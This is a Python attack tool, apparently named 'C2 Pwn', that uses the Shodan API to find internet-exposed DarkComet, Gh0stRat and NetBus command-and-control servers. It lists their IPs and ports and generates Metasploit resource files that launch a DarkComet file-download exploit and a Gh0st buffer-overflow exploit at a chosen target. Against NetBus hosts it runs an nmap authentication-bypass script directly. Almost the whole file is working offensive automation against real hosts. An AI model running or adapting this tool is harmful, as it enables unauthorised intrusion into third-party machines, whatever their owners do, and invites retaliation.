## Author: LukeBob
## Automate Pwning C2 "Command and Controll" Servers Using Vulnerable Versions
## Carefull As You Could Possibly Attack An Expeirenced OP And Get Attacked Back
## C2 pwn

import os
import shodan
from time import sleep
import argparse
banner =("""

     ___ ____      ___
    / __\___ \    / _ \_      ___ __
   / /    __) |  / /_)| \ /\ / / '_ '
  / /___ / __/  / ___/ \ V  V /| | | |
  \____/|_____| \/      \_/\_/ |_| |_|

    (V-1.0) Author: LukeBob
""")

## Terms you can use on shodan "free version" to pickup C2 Servers
## On paid version you could go much deeper
malware_terms = {
    "DarkComet"   : "BF7CAB464EFB",
    "Gh0stRat"    : "gh0st",
    "NetBus"      : "NetBus 1.60"
}

## Creates New Shodan Api Object
def get_api(api_key):
    try:
        print('\n\t[#] Connecting To Shodan API...')
        api = shodan.Shodan(api_key)
        sleep(1)
        api.info()
        print('\t[#] Successfully Created New Shodan API Instance!\n\n\n')
        return(api)
    except shodan.exception.APIError as e:
        print('\t[#] Error: %s' % e)
        exit(0)

## Gets Back Results in Dictionary Format
def search(api, term, name):
    try:
        results = api.search(term)
        return results
    except shodan.APIError as e:
        print('Error: %s' % e)
        exit(0)

## Create One RC file For metasploit
def pwn_one(results, name):
    print("""
        [#] Options
        --------------------------
        (1) List Available Targets
        (2) Choose Ip
        ---------------------------

    """)
    sing_choice = input('[*] Option (1,2): ')
    if sing_choice == '1':
        print('\n\n\t\t----------------------------\n\t\t %s C2 Server List\n\t\t----------------------------\n\n'%(name))
        for i in results['matches']:
            print("\t\t IP: {0} -- Port: {1}".format(i['ip_str'],i['port']))
        print("\n")

        IP    = input("[*]Target Ip: ")
        print("===> %s\n"%(IP))
        PORT  = input("[*]Target Port: ")
        print("===> %s\n"%(PORT))
        LIP   = input("[*]Listner Ip: ")
        print("===> %s\n"%(LIP))
        LPORT = input("[*]Listner Port: ")
        print("===> %s\n"%(LPORT))

        ## Dark Comet rc choice-1
        if name == "DarkComet":

            payload_comm =(
            """
use auxiliary/gather/darkcomet_filedownloader
set RHOST %s
set RPORT %s
set LHOST %s
exploit
            """%(IP, PORT, LIP))

            with open("DarkComet_Metasploit.rc", "w+") as file:
                file.write(payload_comm)
            print("\n\tNew Metasploit rc File Written To DarkComet_Metasploit.rc")
            os.system("service postgresql restart")
            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.r ")
            sleep(7)
        ## Gh0st rc choice-1
        if name == 'gh0st':
            payload_comm = (
            """
use exploit/windows/misc/gh0st
set RHOST %s
set MAGIC Ghost
set RPORT %s
set LPORT %s
exploit
            """%(IP, PORT, LPORT))
            with open("GhostRat_Metasploit.rc", "w+") as file:
                file.write(payload_comm)
            print("\n\tNew Metasploit rc File Written To GhostRat_Metasploit.rc")
            os.system("service postgresql restart")
            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r GhostRat_Metasploit.rc")
            print("\n\tRemember if you are behind nat to port forward port %s"%(LPORT))
            sleep(7)

        if name == "NetBus":
            print("\n\t[#]Trying Auth Bypass ... ")
            NB_comm = "nmap -p %s --script netbus-auth-bypass %s"%(PORT, IP)
            os.system(NB_comm)


    elif sing_choice == '2':
        IP    = input("[*]Target Ip: ")
        print("===> %s\n"%(IP))
        PORT  = input("[*]Target Port: ")
        print("===> %s\n"%(PORT))
        LIP   = input("[*]Listner Ip: ")
        print("===> %s\n"%(LIP))

        ## Dark comet rc choice-2
        if name == "DarkComet":
            payload_comm =(
            """
use auxiliary/gather/darkcomet_filedownloader
set RHOST %s
set RPORT %s
set LHOST %s
exploit
            """%(IP, PORT, LIP))

            with open("DarkComet_Metasploit.rc", "w+") as file:
                file.write(payload_comm)
            print("\n\tNew Metasploit rc File Written To DarkComet_Metasploit.rc")
            os.system("service postgresql restart")
            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.rc")
            sleep(7)

        ## gh0st rc choice-2
        if name == "gh0st":
            payload_comm = (
            """
use exploit/windows/misc/gh0st
set RHOST %s
set MAGIC Ghost
set RPORT %s
set LPORT %s
exploit
            """%(IP, PORT, LPORT))
            with open("GhostRat_Metasploit.rc", "w+") as file:
                file.write(payload_comm)
            print("\n\tNew Metasploit rc File Written To GhostRat_Metasploit.rc")
            os.system("service postgresql restart")
            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r GhostRat_Metasploit.rc")
            print("\n\tRemember if you are behind nat to port forward port %s"%(LPORT))
            sleep(7)

        ## Netbus rc Choice-2
        if name == "NetBus":
            print("\n\t[#]Trying Auth Bypass ... ")
            NB_comm = "nmap -p %s --script netbus-auth-bypass %s"%(PORT, IP)
            os.system(NB_comm)

def main(key):
    quit = False
    api = get_api(key)
    while not quit:
        print("""

            [#] C2 ServerList [#]
            ---------------------
            (1) DarkComet   <-- DarkComet Server Remote File Download Exploit <---> https://www.rapid7.com/db/modules/auxiliary/gather/darkcomet_filedownloader
            (2) Gh0stRat    <-- Gh0st Client buffer Overflow                  <---> https://www.rapid7.com/db/modules/exploit/windows/misc/gh0st
            (3) NetBus      <-- Netbus Auth Bypass                            <---> https://nmap.org/nsedoc/scripts/netbus-auth-bypass.html
            (4) Quit
            ---------------------

            """)
        number = input("[*] C2 Server Kind You Wish To Exploit (1,2,3,4): ")
        print("\n\n")
        if number == '1':
            name="DarkComet"
            new_dict = search(api, term=malware_terms["DarkComet"], name=name)
        if number == '2':
            name="gh0st"
            new_dict = search(api, term=malware_terms["Gh0stRat"], name=name)
        if number == '3':
            name="NetBus"
            new_dict = search(api, term=malware_terms["NetBus"], name=name)
        if number == '4':
            print("\n\t Shutting Down Program")
            quit = True

        if not quit:
            pwn_one(new_dict, name)

if __name__ == '__main__':
        print(banner)
        sleep(1)
        parser = argparse.ArgumentParser(description='C2 Pwn')
        parser.add_argument('--key', help='Shodan Api Key')
        args = parser.parse_args()
        if args.key:
            key = args.key
            main(key)
        else:
            parser.print_help()
            quit(0)
